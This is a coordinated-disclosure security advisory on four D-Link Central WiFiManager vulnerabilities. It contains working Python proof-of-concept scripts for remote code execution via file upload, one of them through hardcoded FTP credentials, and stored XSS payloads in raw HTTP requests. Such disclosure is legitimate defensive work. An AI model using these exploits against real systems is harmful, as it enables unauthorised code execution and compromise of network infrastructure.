@@ -1,0 +1,315 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+D-Link Central WiFiManager Software Controller Multiple Vulnerabilities
+
+1. *Advisory Information*
+
+Title: D-Link Central WiFiManager Software Controller Multiple
+Vulnerabilities
+Advisory ID: CORE-2018-0010
+Advisory URL: http://www.coresecurity.com/advisories/d-link-central-wifimanager-software-controller-multiple-vulnerabilities
+Date published: 2018-10-04
+Date of last update: 2018-10-04
+Vendors contacted: D-Link
+Release mode: Coordinated release
+
+2. *Vulnerability Information*
+
+Class: Unrestricted Upload of File with Dangerous Type [CWE-434],
+Improper Authorization [CWE-285], Improper Neutralization of Input
+During Web Page Generation ('Cross-site Scripting') [CWE-79], Improper
+Neutralization of Input During Web Page Generation
+('Cross-site Scripting') [CWE-79]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+CVE Name: CVE-2018-17440, CVE-2018-17442, CVE-2018-17443, CVE-2018-17441
+
+3. *Vulnerability Description*
+
+D-Link's website states that:
+
+[1] Central WiFiManager Software Controller helps network administrators
+streamline their wireless access point (AP) management workflow. Central
+WiFiManager is an innovative approach to the more traditional
+hardware-based multiple access point management system. It uses a
+centralized server to both remotely manage and monitor wireless APs on a
+network.
+
+Vulnerabilities were found in the Central WiFiManager Software
+Controller, allowing unauthenticated and authenticated file upload with
+dangerous type that could lead to remote code execution with system
+permissions. Also, two stored Cross Site Scripting vulnerabilities were
+found.
+
+4. *Vulnerable Packages*
+
+    . Central WifiManager v1.03
+
+Other products and versions might be affected, but they were not tested.
+
+5. *Vendor Information, Solutions and Workarounds*
+
+D-Link released the following Beta version that addresses the reported vulnerabilities:
+
+    . Central WifiManager v 1.03r0100-Beta1
+
+In addition, D-Link published a security note in:
+https://securityadvisories.dlink.com/announcement/publication.aspx?name=SAP10092
+
+6. *Credits*
+
+These vulnerabilities were discovered and researched by Julian Muñoz
+from Core Security Consulting Services. The publication of this advisory
+was coordinated by Leandro Cuozzo from Core Advisories Team.
+
+7. *Technical Description / Proof of Concept Code*
+
+D-Link Central WiFiManager Software Controller exposes an FTP server
+that serves by default in port 9000 and has hardcoded credentials
+(admin, admin). Taking advantage of this fact, we will upload a PHP file
+in the '/web/public' directory and then, by requesting this file, will
+be able to execute arbitrary code on the target system (shown in 7.1).
+
+On 7.2 we show a similar attack to but in this case with an
+authenticated user in the web application. The application has a
+functionality to upload a .rar file used for the captive portal
+displayed by the Access Points. We will craft a .rar with a PHP file
+that we will end up executing in the context of the web application.
+When the .rar is uploaded is stored in the path "\web\captivalportal" in
+a folder with a timestamp created by the PHP time() function. In order
+to know what is the web server's time we request an information file
+that contains the time we are looking for. After we have the server's
+time we upload the .rar, calculate the proper epoch and request the
+appropriate path increasing this epoch by one until we hit the correct
+one.
+
+Finally, we discovered two Cross-Site Scripting, one on the update site
+functionality, in the 'sitename' parameter (7.3) and the other one on
+the creation of a local user in the 'username' parameter (7.4).
+
+7.1. *Unauthenticated Remote Code Execution by Unrestricted Upload of
+File with Dangerous Type*
+
+[CVE-2018-17440] The web application starts an FTP server running on the
+port 9000 by default with admin/admin credentials and do not show the
+option to change it, so in this POC we establish a connection with the
+server and upload a PHP file. Since the application do not restrict
+unauthenticated users to request any file in the web root, we later
+request the uploaded file to achieve remote code execution.
+
+/-----
+import requests
+from ftplib import FTP
+
+#stablish connection with FTP server
+host_ip = "127.0.0.1"
+ftp = FTP()
+ftp.connect(host=host_ip<ftp://ftp.connect(host=host_ip>, port=9000)
+ftp.login(<ftp://ftp.login(>"admin", "admin")
+data = []
+
+#create PHP poc file
+poc_php_file = open("poc.php", "w+")
+poc_php_file.write("<?php\nsystem('whoami');\n?>")
+poc_php_file.close()
+
+#upload PHP poc file
+php_file = open("poc.php", "rb")
+ftp.cwd('/web/public')<ftp://ftp.cwd('/web/public')>
+ftp.storbinary(<ftp://ftp.storbinary(>"STOR write_file.php", php_file)
+ftp.dir(data.append)<ftp://ftp.dir(data.append)>
+ftp.quit()<ftp://ftp.quit()>
+
+for line in data:
+  print "-", line
+
+session = requests.Session()
+session.trust_env = False
+
+#get the uploaded file for remote code execution
+get_uploaded_file = session.get('https://127.0.0.1/public/write_file.php', verify=False)
+
+print get_uploaded_file.text
+-----/
+
+7.2. *Authenticated Remote Code Execution by Unrestricted Upload of File with Dangerous Type*
+
+[CVE-2018-17442] In this case we make a file upload using the
+functionality given by the onUploadLogPic endpoint, that will take a
+.rar file, decompress it and store it in a folder named after the PHP
+time() function. Our goal is first obtain the server's time, upload a
+.rar with our PHP file, calculate the proper epoch and iterate
+increasing it until we hit the proper one and remote code execution is
+achieved.
+
+/-----
+import re
+import time
+import requests
+import datetime
+import tarfile
+
+def parse_to_datetime(date_string):
+    date_list = date_string.split("-")
+    td = date_list[2][2:].split(":")
+    return datetime.datetime(int(date_list[0]), int(date_list[1]), int(date_list[2][:2]),int(td[0]), int(td[1]), int(td[2]))
+
+session = requests.Session()
+session.trust_env = False
+php_session_id = "96sml0e9soke02k6d672oumqq4" #example (insert here the proper session id)
+cookie = {'PHPSESSID': php_session_id}
+
+#create tar file to upload.
+poc_php_file = open("poc.php", "w+")
+poc_php_file.write("<?php\nsystem('whoami');\n?>")
+poc_php_file.close()
+
+poc_tar_file = tarfile.open("poc_tar_file.tar", mode="w")
+poc_tar_file.add("poc.php")
+poc_tar_file.close()
+
+#get server datetime.
+get_server_time_from_requested_file = session.get('https://127.0.0.1/index.php/ReportSecurity/ExportAP/type/TXT',
+                                                  cookies=cookie, verify=False)
+date = re.search("Date(.*)\d", get_server_time_from_requested_file.text).group().replace('DateTime ', '')
+#generate epoch from server's date
+epoch = int(time.mktime(parse_to_datetime(date).timetuple()))
+
+#upload attack PHP file.
+attack_tar_file = "poc_tar_file.tar"
+tar_file = {'stylename': 'attack', 'logfile': open(attack_tar_file, 'rb')}
+restore_backup_response = session.post('https://127.0.0.1/index.php/Config/onUploadLogPic',
+                                       files=tar_file,
+                                       cookies=cookie, verify=False)
+
+for i in range(0,20):
+    #get the uploaded file named after time epoch, returned by PHP time() function.
+    filename = str(epoch) + "/" + "poc.php"
+    get_uploaded_file = session.get('https://127.0.0.1/captivalportal/%s' %filename, verify=False)
+    if get_uploaded_file.status_code == 200:
+        print "Remote Code Execution Achived"
+        print get_uploaded_file.text
+        break
+    epoch += 1
+-----/
+
+7.3. *Cross-Site Scripting in the application site name parameter*
+
+[CVE-2018-17443] The 'sitename' parameter of the UpdateSite endpoint is
+vulnerable to a stored Cross Site Scripting:
+
+The following is a proof of concept to demonstrate the vulnerability:
+
+/-----
+POST /index.php/Config/UpdateSite HTTP/1.1
+Host: 10.2.45.220
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://10.2.45.220/index.php/Config/CreatSite
+Cookie: Test_showmessage=false; Test_tableStyle=1; think_language=en-US;
+PHPSESSID=4fvbnmn343424rg8m1jg3qbc05
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 66
+
+siteid=0&sitename=<script>alert(1)</script>&sitenamehid=fakesitename&UserMember%5B%5D=1
+-----/
+
+7.4. *Cross-Site Scripting in the creation of a new user*
+
+[CVE-2018-17441] The 'username' parameter of the addUser endpoint is
+vulnerable to a stored Cross Site Scripting.
+
+The following is a proof of concept to demonstrate the vulnerability:
+
+/-----
+POST /index.php/System/addUser HTTP/1.1
+Host: 10.2.45.220
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://10.2.45.220/index.php/System/userManager
+Content-Type: application/x-www-form-urlencoded;
+Content-Length: 96
+Cookie: Test_showmessage=false; Test_tableStyle=1; think_language=en-US;
+PHPSESSID=4fvbnmn343424rg8m1jg3qbc05
+Connection: close
+
+username=<script>alert(1)</script>&userpassword=fakepassword&level=1&email=&remark=&userid=0&creator=1&mandatory=change&
+-----/
+
+8. *Report Timeline*
+
+2018-06-04: Core Security sent an initial notification to D-Link,
+including a draft advisory.
+2018-06-06:D-Link confirmed the reception of the advisory and informed
+they will have an initial response on 06/08.
+2018-06-08: D-Link informed that they would provide a schedule for the
+fixes on 06/13.
+2018-06-08: Core Security thanked the update.
+2018-06-14: D-Link informed its plan of remediation and notified Core
+Security that the fixed version will be available on 08/31.
+2018-06-15: Core Security thanked the update and proposed to keep in
+regular contact until this tentative release date.
+2018-07-23: Core Security requested a status update.
+2018-07-25: D-Link answered saying that they are still targeting 08/31
+as the release date.
+2018-08-24: Core Security requested a new status update and a solidified
+release date for the fixed version.
+2018-08-28: D-Link sent a beta version for test.
+2018-08-30: Core Security tested the beta version and requested D-Link
+to coordinate a release date.
+2018-09-21: D-Link informed that they were planning a security
+announcement and they were ready to schedule a disclosure date.
+2018-09-24: Core Security thanked the update and proposed October 4th as
+the publication date.
+2018-10-04: Advisory CORE-2018-0010 published.
+
+9. *References*
+
+[1] http://us.dlink.com/products/business-solutions/central-wifimanager-software-controller/.
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security, is charged with
+anticipating the future needs and requirements for information security
+technologies. We conduct our research in several important areas of
+computer security including system vulnerabilities, cyber attack
+planning and simulation, source code auditing, and cryptography. Our
+results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+11. *About Core Security*
+
+Core Security provides companies with the security insight they need to
+know who, how, and what is vulnerable in their organization. The
+company's threat-aware, identity & access, network security, and
+vulnerability management solutions provide actionable insight and
+context needed to manage security risks across the enterprise. This
+shared insight gives customers a comprehensive view of their security
+posture to make better security remediation decisions. Better insight
+allows organizations to prioritize their efforts to protect critical
+assets, take action sooner to mitigate access risk, and react faster if
+a breach does occur.
+
+Core Security is headquartered in the USA with offices and operations in
+South America, Europe, Middle East and Asia. To learn more, contact Core
+Security at (678) 304-4500 or info@coresecurity.com<mailto:info@coresecurity.com>
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2018 Core Security and
+(c) 2018 CoreLabs, and are licensed under a Creative Commons Attribution
+Non-Commercial Share-Alike 3.0 (United States) License:
+http://creativecommons.org/licenses/by-nc-sa/3.0/us/
